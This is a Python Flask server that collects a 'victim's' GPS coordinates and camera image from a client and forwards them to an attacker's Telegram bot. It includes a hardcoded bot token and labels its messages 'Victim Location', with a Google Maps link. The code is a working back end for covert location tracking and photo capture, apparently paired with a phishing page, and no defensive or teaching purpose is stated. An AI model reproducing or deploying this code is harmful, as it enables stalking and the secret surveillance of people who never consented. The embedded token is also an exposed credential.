
from flask import Flask, request
import requests
import base64

app = Flask(__name__)

BOT_TOKEN = "7016979851:AAH9GxifU8Ap3_FWt_bsz6mE4cXGuHPJAdI"
CHAT_ID = "YOUR_CHAT_ID"  # استبدله بـ chat_id الحقيقي

def send_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": CHAT_ID, "text": text})

def send_photo(image_data):
    if image_data:
        image_data = image_data.split(",")[1]
        with open("photo.jpg", "wb") as f:
            f.write(base64.b64decode(image_data))
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        with open("photo.jpg", "rb") as f:
            requests.post(url, files={"photo": f}, data={"chat_id": CHAT_ID})

@app.route("/report", methods=["POST"])
def report():
    data = request.get_json()
    lat = data.get("latitude")
    lon = data.get("longitude")
    image = data.get("image")
    send_message(f"Victim Location:\nLatitude: {lat}\nLongitude: {lon}\nhttps://maps.google.com/?q={lat},{lon}")
    send_photo(image)
    return "OK"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
